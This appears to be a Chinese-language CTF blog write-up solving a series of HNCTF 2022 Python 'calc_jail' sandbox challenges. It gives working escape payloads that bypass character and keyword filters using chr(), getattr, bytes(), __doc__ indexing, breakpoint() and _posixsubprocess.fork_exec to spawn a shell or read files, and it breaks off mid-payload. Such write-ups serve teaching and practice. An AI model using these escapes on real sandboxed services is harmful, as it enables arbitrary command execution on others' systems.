src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731163235565.png" alt="image-20230731163235565"></p><p><code>__base__</code>是返回这个对象所属类的父类 <code>__mro__</code>是以元组的形式返回与该对象所属类相关的所有类 <code>__bases__</code>是以元组的形式返回这个对象</p><p>所属类的父类</p><p><code>__subclasses__()</code> <font color='red'>别丢括号</font>这个函数会返回当前吗父类下的所有子类 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731163859985.png" alt="image-20230731163859985"></p><p>因此我们可以利用这个函数 查看object类的所有子类 从中找到我们可以利用的类来进行rce(远程命令执行) 当我们想使用具体的类的时候 加上查询结果中对应的下标索引就好</p><p>但是在这题中字母<code>b</code>是被ban掉的 因此我们可以使用getattr()和chr()两个函数来进行拼接和执行函数</p><p>学习一下getsttr()函数：</p><p>描述：</p><p>getsttr()用于返回一个对象属性值</p><p>参数：</p><pre><code>getattr(object, name[, default])</code></pre><p>参数：</p><ul><li>object – 对象。</li><li>name – 字符串，对象属性。</li><li>default – 默认返回值，如果不提供该参数，在没有对应属性时，将触发 AttributeError。</li></ul><p>我们可以使用chr(hex)替换掉被ban掉的字母 这样就可以组成我们需要的函数 getattr()函数可以帮助我们实现运行使用chr()替换的函数</p><p>下面是对于<code>().__class__.__base__.__subclasses__()</code> 使用chr()和getattr()函数的渐变过程</p><p>注意在转化的时候 单引号需要进行省略</p><pre><code>getattr(().__class__, &#39;__base__&#39;).__subclasses__()getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)).__subclasses__()getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), &#39;__subclasses__&#39;)()getattr(getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()</code></pre><p>我们尝试在题目环境中输入这段命令 查看返回的object父类中包含的所有子类</p><pre><code>Answer: [&lt;class &#39;type&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;dict_reverseitemiterator&#39;&gt;, &lt;class &#39;dict_reversekeyiterator&#39;&gt;, &lt;class &#39;dict_reversevalueiterator&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;pickle.PickleBuffer&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;symtable entry&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;types.GenericAlias&#39;&gt;, &lt;class &#39;anext_awaitable&#39;&gt;, &lt;class &#39;async_generator_asend&#39;&gt;, &lt;class &#39;async_generator_athrow&#39;&gt;, &lt;class &#39;async_generator_wrapped_value&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;InterpreterID&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;weakref.CallableProxyType&#39;&gt;, &lt;class &#39;weakref.ProxyType&#39;&gt;, &lt;class &#39;weakref.ReferenceType&#39;&gt;, &lt;class &#39;types.UnionType&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;_contextvars.Context&#39;&gt;, &lt;class &#39;_contextvars.ContextVar&#39;&gt;, &lt;class &#39;_contextvars.Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc._abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;]</code></pre><p>在下标索引为<code>-4</code>的位置看到了<code>&lt;class &#39;os._wrap_close&#39;&gt;</code> 可以构造payload</p><pre><code class="python">().__class__.__base__.__subclasses__()[-4].__init__.__global__[&#39;sysytem&#39;](&#39;sh&#39;)</code></pre><p>整体转换一下</p><pre><code>getattr(getattr(getattr(getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4], chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)), chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</code></pre><p>进入sh交互模式 找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731172455253.png" alt="image-20230731172455253"></p><p><strong>NSSCTF{aeb2432a-8fdd-4c36-81d6-8a60bf3d8212}</strong></p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p><code>__builtins__</code>模块用于查看python内部的内置变量和内置函数</p><p><code>__builtins__</code>是对<code>builtins</code>的引用 在任何地方使用<code>builtins</code>都必须import 但是使用<code>__builtins__</code>不需要使用import </p><p>写出payload</p><pre><code class="python">__builtins__.__import__(&#39;os&#39;).system(&#39;cat flag&#39;)</code></pre><p>调用了os模块的system函数(用于在操作系统的 shell 中执行命令。它接收一个字符串参数 <code>command</code>，表示要执行的系统命令，然后将该命令传递给操作系统的 shell 进行执行) 执行<code>cat flag</code>命令 直接读取flag文件的值</p><p>在这之前还要通过input()函数 输入上述payload 因为环境ban掉了字母<code>i</code> 因此我们还是使用chr()函数 替换掉input()函数</p><pre><code class="python">eval(chr(0x65)+chr(0x78)+chr(0x65)+chr(0x63)+chr(0x28)+chr(0x69)+chr(0x6e)+chr(0x70)+chr(0x75)+chr(0x74)+chr(0x28)+chr(0x29)+chr(0x29))# eval(exec(input()))&#39;&#39;&#39;exec()的作用动态执行代码：exec() 允许在程序运行时根据需要执行动态生成的 Python 代码。这对于动态创建函数、类、变量等非常有用。动态导入模块：使用 exec() 可以实现在运行时动态导入模块，而不是在代码中固定导入。执行用户输入的代码：exec() 可以用于执行用户输入的 Python 代码，允许在程序运行时根据用户的输入执行相应的操作。脚本执行：有时候，你可能希望从文件或网络获取一段 Python 代码，并在程序中执行它。exec() 允许你动态地执行从外部来源获取的代码。&#39;&#39;&#39;</code></pre><p>当然这个payload的前提是 知道flag文件的位置和名字 </p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>同样 在知道flag的位置和名字的时候 我们可以直接open并read到flag</p><pre><code>open(chr(102)+chr(108)+chr(97)+chr(103)).read()# open(&#39;flag&#39;).read()</code></pre><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL-参数逃逸"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL-参数逃逸" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL 参数逃逸)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL 参数逃逸)</h2><p>这一关是限制了输入命令的长度为13个字符 13个字符 正好<code>eval(input())</code></p><p>这样我们在想输入什么命令就没有限制了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731201557462.png" alt="image-20230731201557462"></p><p><strong>NSSCTF{c6bdf2aa-f85f-49cf-ac71-b892ad007a47}</strong></p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL-breakpoint"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL-breakpoint" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL breakpoint())"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL breakpoint())</h2><p>这次是直接限制了<code>exec eval input</code>  同时payload的长度限制在了13位</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731202239224.png" alt="image-20230731202239224"></p><p>这里使用一个叫做breakpoint()的函数  可以进入一个Pdb交互界面</p><pre><code>pdb 模块定义了一个交互式源代码调试器，用于Python 程序。 它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意Python 代码。 它还支持事后调试，可以在程序控制下调用。 调试器是可扩展的——调试器实际被定义为 Pdb 类。</code></pre><p> 之后在输入<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>就可以进入shell了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731203228696.png" alt="image-20230731203228696"></p><p>得到flag：<strong>NSSCTF{69432ccf-eb26-4236-a1f0-a78b02a8ae71}</strong></p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL-help"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL-help" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL help())"></a>[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL help())</h2><p>这关相比level2 限制的字数更少 payload不能超过7个字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731204432274.png" alt="image-20230731204432274"></p><p>这边是使用help()函数进行rce</p><p>输入help()之后也会进入一个交互界面 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731213412627.png" alt="image-20230731213412627"></p><p>按照上面提到的方式 先输入<code>modules</code> 查看所有的模块 随便选一个输入  比如看到的<code>os</code></p><pre><code>modulesos!ls!cat flag</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731213810206.png" alt="image-20230731213810206"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731213823579.png" alt="image-20230731213823579"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731214138100.png" alt="image-20230731214138100"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731214206969.png" alt="image-20230731214206969"></p><p><strong>NSSCTF{4e28ebac-4a64-4205-8853-b49286703415}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL、bytes-decode-、-doc"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL、bytes-decode-、-doc" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL、bytes([]).decode() 、__doc__)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL、bytes([]).decode() 、<code>__doc__</code>)</h2><p>查看源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801201356423.png" alt="image-20230801201356423"></p><p>将<code>&#39;__loader__&#39;, &#39;__import__&#39;, &#39;compile&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;chr&#39;</code>等函数都ban掉了 后面又将单引号、双引号、反斜杠、反引号给ban了</p><p>因为ban掉了<code>__import__</code>之前提到的help()和breakpoint()都没有办法使用 但是并没有ban掉其余的字母</p><h3 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h3><p>尝试使用之前的SSTI注入 先查询object类下的子类  查看可以使用的模块</p><pre><code>().__class__.__base__.__subclasses__()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801223643348.png" alt="image-20230801223643348"></p><p>并没有过滤模块 os模块还可以使用 虽然禁用了<code>chr()</code>函数 但是bytes()函数也可以构造字符串 下面是转化过程：</p><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)转化为().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801225100070.png" alt="image-20230801225100070"></p><h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>同样是使用bytes()函数 猜测flag文件的位置和名字 可以直接对 <code>open(&#39;flag&#39;).read()</code>进行转化  直接读取flag</p><pre><code>open(bytes([102,108,97,103]).decode()).read()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801225252004.png" alt="image-20230801225252004"></p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>像一些默认类，如：str、dict、list等，都会有相应的文档。这时可以直接从<code>__doc__</code>里面去找，用索引的方式获得想要的字符，并拼接再一起，得到想要的字符串。</p><p>在这里 我们使用列表这个类来查找字符</p><pre><code class="python">print([].__doc__)&#39;&#39;&#39;输出：Built-in mutable sequence.If no argument is given, the constructor creates a new empty list.The argument must be an iterable if specified.&#39;&#39;&#39;</code></pre><p>使用find命令查找字符下标</p><pre><code class="python">print([].__doc__.find(&#39;s&#39;))&#39;&#39;&#39;输出：17&#39;&#39;&#39;</code></pre><p>那么可以使用下标进行拼接system和sh函数</p><pre><code class="python"># system[].__doc__[17]+[].__doc__[87]+[].__doc__[17]+[].__doc__[4]+[].__doc__[15]+[].__doc__[9]# sh[].__doc__[17]+[].__doc__[54]</code></pre><p>下面是转换过程</p><pre><code class="python">().__class__.__base__.subclasses__()[-4].__init__.__globals__[&#39;system&#39;].(&#39;sh&#39;)().__class__.__base__.__subclasses__()[-4].__init__.__globals__[[].__doc__[17]+[].__doc__[87]+[].__doc__[17]+[].__doc__[4]+[].__doc__[15]+[].__doc__[9]]([].__doc__[17]+[].__doc__[54])</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801231059013.png" alt="image-20230801231059013"></p><h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804204635253.png" alt="image-20230804204635253"></p><p>在题干处给出ban掉了<code>__loader__,__import__,compile,eval,exec,chr,input,locals,globals and </code>,”,’ &#96;</p><p>同level4 三种方法任选其一即可</p><p><strong>NSSCTF{58d8ebf7-2162-4bdb-a2a6-98515e0871bc}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL-下标索引-bytes"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL-下标索引-bytes" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL 下标索引 bytes())"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL 下标索引 bytes())</h2><p>在题干处给出提示 ban掉了<code>__loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and</code>,”,’&#96;</p><p>与上两题不同 这次将<code>bytes</code>也ban掉了 第二种和第一种方法就没法使用了</p><p>但是第三种方法还是可以使用的  </p><p>这里仿照第一种方法的形式 先查看object下的所有子类 发现<code>bytes</code>的下标索引是6  因此可以进行利用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804220530811.png" alt="image-20230804220530811"></p><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())转化为().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[6]([115,104]).decode())</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804221050269.png" alt="image-20230804221050269"></p><p><strong>NSSCTF{006582c3-2430-49d8-9cee-b631c7aed4dc}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)</h2><p>同level4.1 </p><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[6]([115,104]).decode())</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804225030885.png" alt="image-20230804225030885"></p><p><strong>NSSCTF{ab748a53-bafc-41cb-bb20-b22b025fdb8e}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL-str-join拼接字符"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL-str-join拼接字符" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL str().join拼接字符)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL str().join拼接字符)</h2><p>这里看题干知道 除了ban掉上一题的内容还ban掉了<code>+</code>  其实使用上一题的payload是完全没问题的</p><p>禁用<code>+</code> 但是我们还可以使用<code>john()</code>函数进行拼接 </p><pre><code>&#39;&#39;.join([&#39;s&#39;, &#39;y&#39;, &#39;s&#39;, &#39;t&#39;, &#39;e&#39;, &#39;m&#39;])</code></pre><p>这样就能得到system 但是双引号也被ban掉了 我们可以使用<code>str()</code>这个函数 就相当于一个双引号 </p><pre><code>str().join([&#39;s&#39;, &#39;y&#39;, &#39;s&#39;, &#39;t&#39;, &#39;e&#39;, &#39;m&#39;])</code></pre><p>由此可以得到payload</p><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[[].__doc__[17]+[].__doc__[87]+[].__doc__[17]+[].__doc__[4]+[].__doc__[15]+[].__doc__[9]]([].__doc__[17]+[].__doc__[54])().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([[].__doc__[17],[].__doc__[87],[].__doc__[17],[].__doc__[4],[].__doc__[15],[].__doc__[9]])](str().join([[].__doc__[17],[].__doc__[54]]))</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805221344148.png" alt="image-20230805221344148"></p><p><strong>NSSCTF{b13441a1-e6e1-4ab0-968c-f80170f5925f}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-dir"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-dir" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5(dir())"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5(dir())</h2><p>并没有ban掉什么内容  提示flag在dir()里面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805131907416.png" alt="image-20230805131907416"></p><p>其实直接使用最开始的SSTI注入 就可以直接进入交互模式</p><pre><code>().__class__.__base__.__subclasses__()[-6].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)</code></pre><p>或者直接进行rce</p><pre><code>__import__(&#39;os&#39;).system(&#39;cat flag&#39;)</code></pre><p>但是这里我们选择使用dir()来解决题目</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805134401775.png" alt="image-20230805134401775"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805134321794.png" alt="image-20230805134321794"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805134347519.png" alt="image-20230805134347519"></p><p>发现<code>encode</code>函数可以使用</p><pre><code>my_flag.flag_level5.encode()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805135450313.png" alt="image-20230805135450313"></p><p>来看一下源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805140540826.png" alt="image-20230805140540826"></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-1"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-1" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1</h2><p>同level5 只是这次有了一些黑名单的过滤</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805135908651.png" alt="image-20230805135908651"></p><p>可以使用SSTI注入进入交互模式 也可以直接使用dir()拿到flag</p><p><strong>NSSCTF{6e6ce512-08e0-4792-9d14-cb41370382b2}</strong></p><h2 id="HNCTF-2022-WEEK3-calc-jail-beginner-level6-JAIL-posixsubprocess-fork-exec-lamba表达式"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level6-JAIL-posixsubprocess-fork-exec-lamba表达式" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL _posixsubprocess.fork_exec lamba表达式)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL _posixsubprocess.fork_exec lamba表达式)</h2><p>这次是给出了白名单 只有在白名单中的函数才可以使用 <code>builtins.input,builtins.input/result,exec,compile</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805171210883.png" alt="image-20230805171210883"></p><h3 id="方法一：-2"><a href="#方法一：-2" class="headerlink" title="方法一："></a>方法一：</h3><p>这里需要使用<code>_posixsubprocess.fork_exec</code></p><p>首先将<code>_posixsubprocess</code>类导进去 <code>import</code>使用不了 但是<code>__builtins__</code>还是可以使用的</p><pre><code class="python">__builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;)或：__loader__.load_module(&#39;_posixsubprocess&#39;)</code></pre><p>下面是完整的payload</p><pre><code>import os__loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)</code></pre><p>进入shell界面 读取flag就好(虽然会在shell和python界面来回切换)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805172325862.png" alt="image-20230805172325862"></p><p><strong>NSSCTF{a7586393-169d-4daf-abcf-db107c89c33a}</strong></p><h3 id="方法二：-2"><a href="#方法二：-2" class="headerlink" title="方法二："></a>方法二：</h3><pre><code>exec(&quot;globals()[&#39;__builtins__&#39;][&#39;set&#39;]=lambda x: [&#39;builtins.input&#39;, &#39;builtins.input/result&#39;,&#39;exec&#39;, &#39;compile&#39;, &#39;os.system&#39;]\nimport os\nos.system(&#39;/bin/sh&#39;)&quot;)</code></pre><h2 id="HNCTF-2022-WEEK3-calc-jail-beginner-level6-1-海象运算符、列表、无限迭代器"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level6-1-海象运算符、列表、无限迭代器" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(海象运算符、列表、无限迭代器)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(海象运算符、列表、无限迭代器)</h2><p>给了部分源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805200804050.png" alt="image-20230805200804050"></p><p>这次只能进行一次代码执行操作 使用到一个运算符<code>海象运算符</code></p><pre><code>:=海象运算符的优势在于能在不允许赋值的地方（如if语句的条件表达式中）使用赋值变量。海象运算符左侧有个标识符，赋值表达式的值等于分配给这个标识符的值</code></pre><pre><code>[os := __import__(&#39;os&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), _posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)]</code></pre><p>上一步就是实现level6的payload 先导入os模块 再导入<code>_posixsubprocess</code>模块 在使用<code>_posixsubprocess</code>模块</p><p>但是shell只显示一次shell 就退掉了 因此要使用无线迭代器<code>itertools</code></p><pre><code>[os := __import__(&#39;os&#39;), itertools := __loader__.load_module(&#39;itertools&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], 